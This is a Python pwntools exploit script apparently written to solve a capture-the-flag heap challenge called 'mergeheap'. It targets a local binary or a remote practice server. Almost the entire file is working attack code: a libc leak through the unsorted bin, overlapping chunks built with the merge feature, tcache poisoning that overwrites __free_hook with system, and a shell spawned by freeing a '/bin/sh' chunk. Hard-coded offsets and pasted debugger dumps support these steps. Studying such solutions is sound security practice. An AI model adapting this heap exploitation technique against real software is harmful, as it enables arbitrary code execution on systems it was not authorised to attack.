#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
import os
context.log_level = 'info'
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
locallibc=1
elf = ELF('./mergeheap')
if locallibc:
    io = process('./mergeheap')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    arena = 0x3b4c40
    onegadget = 0x4239e
    onegadget = 0x423f2
    onegadget = 0xe317e
    freehook = 0x3b68e8
else:
    io = remote('node2.buuoj.cn.wetolink.com', 28694)
    libc = ELF('../libc-2.27-x64.so')
    arena = 0x3ebc40
    onegadget = 0x4f2c5
    onegadget = 0x4f322
    onegadget = 0x10a38c
    freehook = 0x3ed8e8
def debug():
    if locallibc == 0:
        return ;
    binaryname = 'mergeheap'
    interruptPoint=[0xc74, 0xdea, 0xf87]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFbase = 0
    libcBase = 0
    for inf in maps.readlines():
        if ELFbase == 0:
            if binaryname in inf:
                ELFbase = int(inf.split('-', 1)[0], 16)
        if libcBase == 0:
            if 'libc' in inf:
                libcBase = int(inf.split('-', 1)[0], 16)
    info('pid -> {}'.format(pid))
    success('elfbase', ELFbase)
    if len(interruptPoint):
        for inter in interruptPoint:
            success('interruptPoint', inter+ELFbase)
    success('libcBase', libcBase)
    # gdb.attach(io, 'b * {}'.format(interruptPoint[0]+ELFbase))

    raw_input('debug>')



def add(size, content):
    info ('add({}, {})'.format(size, content))
    io.sendlineafter('>>', '1')
    io.sendlineafter('len:', str(size))
    if len(content) < size:
        content += '\n'
    io.sendafter('content:', content)

def show(idx):
    io.sendlineafter('>>', '2')
    io.sendlineafter('idx:', str(idx))

def dele(idx):
    info ('delete({})'.format(idx))
    io.sendlineafter('>>', '3')
    io.sendlineafter('idx:', str(idx))

def merge(idx1, idx2):
    info('merge({}, {})'.format(idx1, idx2))
    io.sendlineafter('>>', '4')
    io.sendlineafter('idx1:', str(idx1))
    io.sendlineafter('idx2:', str(idx2))

if __name__ == '__main__':

    for i in range(9):
        add(0x80, '/bin/sh;') # 0,1,2,3,4,5,6,7,8
    for i in range(8):
        dele(i) # 0,1,2,3,4,5,6,7
    for i in range(7):
        add(0x80, '/bin/sh;') # 0 1 2 3 4 5 6  
    '''heap info
                  top: 0x56140239a760 (size : 0x208a0)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x56140239a640 (size : 0x90)
    '''
    add(0x8, 'cccccccc') # 7
    show(7)
    '''heapinfo:
                  top: 0x55bb95b18760 (size : 0x208a0) 
       last_remainder: 0x55bb95b18660 (size : 0x70) 
            unsortbin: 0x55bb95b18660 (size : 0x70)
pwndbg> telescope 0x55bb95b18640
00:0000│   0x55bb95b18640 ◂— 0x0
01:0008│   0x55bb95b18648 ◂— 0x21 /* u'!' */
02:0010│   0x55bb95b18650 ◂— 0x6363636363636363 ('cccccccc')
03:0018│   0x55bb95b18658 —▸ 0x7fb163a48d20 (main_arena+224) —▸  
        '''
    io.recvuntil('c'*8)
    inforecv = u64(io.recv(6).ljust(8, '\x00'))
    libcbase = inforecv-224-arena
    success('libc base', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    libc.addr = libcbase
    add(0x60, 'dddddddd') # 9 chear the unsorted bin
    # overlap
    debug()
    add(0x20, 'a' * 0x20) # 10
    add(0x48, 'b' * 0x48) # 11
    add(0x40, 'c' * 0x40) # 12
    add(0x28, 'd' * 0x28) # 13
    add(0x70, 'e' * 8)    # 14
    dele(11)
    # debug()
    merge(10, 13)
    dele(13) # size = 0x80
    dele(12) # size = 0x30
    
    target = libcbase+freehook
    payload = 'a' * 0x40 + 'bbbbbbbb' + p64(0x31) + p64(target)
    add(0x70, payload)
    # malloc the chunk to free hook
    '''heapinfo
    fd in tcache points to user data

    '''
    dele(0)
    dele(1)
    add(0x20, 'then hijack freehook')
    add(0x20, p64(sys)*4)
    dele(2)

    io.interactive()
    io.close()    
